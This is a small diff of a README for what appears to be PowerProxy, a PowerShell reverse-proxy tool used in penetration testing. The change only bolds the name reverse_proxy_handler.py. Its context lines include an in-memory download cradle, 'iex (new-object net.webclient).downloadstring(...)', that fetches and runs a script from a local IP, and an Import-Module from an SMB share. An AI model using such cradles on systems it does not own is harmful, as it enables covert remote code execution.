@@ -12,7 +12,7 @@ iex (new-object net.webclient).downloadstring("http://192.168.0.22/PowerProxy.ps
 Import-Module \\192.168.0.22\Public\PowerProxy.ps1
 ```
 
-reverse_proxy_handler.py can create temporary SSL certs, which requires OpenSSL. If OpenSSL isn't installed on your machine (it is on most Linux/Unix-based systems), provide your own cert or use the *--no-encrypt* option.
+**reverse_proxy_handler.py** can create temporary SSL certs, which requires OpenSSL. If OpenSSL isn't installed on your machine (it is on most Linux/Unix-based systems), provide your own cert or use the *--no-encrypt* option.
 
 ## Usage
 
